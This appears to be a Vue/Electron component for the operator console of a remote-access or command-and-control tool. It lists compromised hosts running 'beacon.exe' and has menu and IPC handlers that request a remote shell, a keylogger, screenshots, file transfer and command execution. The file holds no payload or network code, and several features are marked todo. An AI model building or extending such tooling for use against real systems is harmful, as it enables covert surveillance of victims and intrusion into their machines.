<template>
  <div>
    <el-table
        :data="tableData"
        border
        height="250"
        style="width: 100%"
        @row-contextmenu="rightClick">
      <el-scrollbar style="height:100%">
        <el-table-column
            key="1"
            prop="externel"
            label="externel"
            width="200">
        </el-table-column>
        <el-table-column
            key="2"
            prop="internel"
            label="internel"
            width="200">
        </el-table-column>
        <el-table-column
            key="3"
            prop="listener"
            label="listener"
            width="150">
        </el-table-column>
        <el-table-column
            key="4"
            prop="user"
            label="user"
            width="150">
        </el-table-column>
        <el-table-column
            key="5"
            prop="process"
            label="process"
            width="100">
        </el-table-column>
      </el-scrollbar>
    </el-table>
    <div id="targetMenu">
      <div class="menu" v-for="(item,index) in menus" :key="index" @click.stop="infoClick(index)">{{ item }}</div>
    </div>
  </div>
</template>

<script>
import { ipcRenderer } from 'electron'

let tableDATA = [{
          externel: '123.122.14.156',
          internel: '192.168.110.130',
          listener: 'test',
          user: 'admin',
          process: 'beacon.exe'
        }, {
          externel: '123.122.14.156',
          internel: '192.168.110.130',
          listener: 'test',
          user: 'admin',
          process: 'beacon.exe'
        }, {
          externel: '123.122.14.156',
          internel: '192.168.110.130',
          listener: 'test',
          user: 'admin',
          process: 'beacon.exe'
        }, {
          externel: '123.122.14.156',
          internel: '192.168.110.130',
          listener: 'test',
          user: 'admin',
          process: 'beacon.exe'
        }, {
          externel: '123.122.14.156',
          internel: '192.168.110.130',
          listener: 'test',
          user: 'admin',
          process: 'beacon.exe'
        }]

export default {
  data () {
    return {
      menus: ['屏幕截图', '键盘记录', '文件目录'],
      tableData: tableDATA,
      currentRowIndex: 0
    }
  },
  methods: {
    // 自定义菜单点击事件
    infoClick(index) {
      
      this.$alert('当前table的下标为'+this.currentRowIndex ,'你点击了自定义菜单的'+this.menus[index]+'功能', {
        confirmButtonText: '确定',
        callback: action => {
          var targetMenu = document.querySelector("#targetMenu");
          targetMenu.style.display = 'none';
        }
      });
      if (this.menus[index]==='屏幕截图'){
        this.updateTargetList()
        // todo Screenshot
      }
      if (this.menus[index]==='键盘记录'){
        this.sendCommand("find BUPT")
      }
      if (this.menus[index]==='文件目录'){
        // todo FileBrowser
      }
    },
    changeCurrentTarget (newUuid) {
      ipcRenderer.once('currentTargetChanged', (event, packet) => {
        console.log(`new target uuid ${packet}`)
      })
      ipcRenderer.send('setCurrentTarget', newUuid)
    },
    updateTargetList () {
      ipcRenderer.once('updateTargetList', (event, packet) => {
        console.log(JSON.stringify(packet))
        console.log(packet[0].uuid)
        this.changeCurrentTarget(packet[0].uuid)
      })
      ipcRenderer.send('requestTargetList')
    },
    requestShell () {
      ipcRenderer.once('getShell', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('requestShell', 'start')
    },
    stopShell () {
      ipcRenderer.once('stopShell', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('requestShell', 'stop')
    },
    requestKeylogger () {
      ipcRenderer.once('updateKeylogger', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('requestKeylogger', 'start')
    },
    disconnectTarget () {
      ipcRenderer.once('disconnected', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('disconnect')
    },
    getScreenShot () {
      ipcRenderer.once('ScreenShot', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('requestScreenShot')
    },
    getFile(path) {
      ipcRenderer.once('transfile', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('requestFile', path)
    },
    requestFilePreview() {
      ipcRenderer.once('filepreview', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('requestFilePreview')      
    },
    sendCommand (commandLines) {
      ipcRenderer.once('commandSended', (event, packet) => {
        alert('Vue:' + packet)
      })
      ipcRenderer.send('sendCommand', commandLines)
    },
    // table的右键点击当前行事件
    rightClick (row, column, event) {
      var targetMenu = document.querySelector("#targetMenu");
      event.preventDefault();
      targetMenu.style.left = (event.clientX-200) + 'px';
      targetMenu.style.top = (event.clientY-60) + 'px';
      targetMenu.style.display = 'block';
      console.log(row, column);
      this.tableData.forEach((item, index) => {
        console.log(item.internel,row.internel)
        if (item.internel === row.internel) {
          this.currentRowIndex = index;
          return false;
        }
      })
    }
  }
}
</script>

<style>
.el-table__body-wrapper::-webkit-scrollbar {
  /*width: 0;宽度为0隐藏*/
  width: 0;
}

.el-table__body-wrapper::-webkit-scrollbar-thumb {
  border-radius: 2px;
  height: 50px;
  background: #eee;
}

.el-table__body-wrapper::-webkit-scrollbar-track {
  overflow-x: hidden;
  overflow-y: hidden;
  box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.2);
  border-radius: 2px;
  background: rgba(0, 0, 0, 0.4);
}

#targetMenu {
  font-size: 12px;
  width: 100px;
  height: 75px;
  overflow: hidden; /*隐藏溢出的元素*/
  box-shadow: 0 1px 1px #888, 1px 0 1px #ccc;
  position: absolute;
  display: none;
  background: #ffffff;
  z-index: 10;
}

.menu {
  width: 125px;
  height: 25px;
  line-height: 25px;
  text-indent: 10px;
  cursor: pointer;
}

.menu:hover {
  color: deeppink;
  text-decoration: underline;
}
</style>
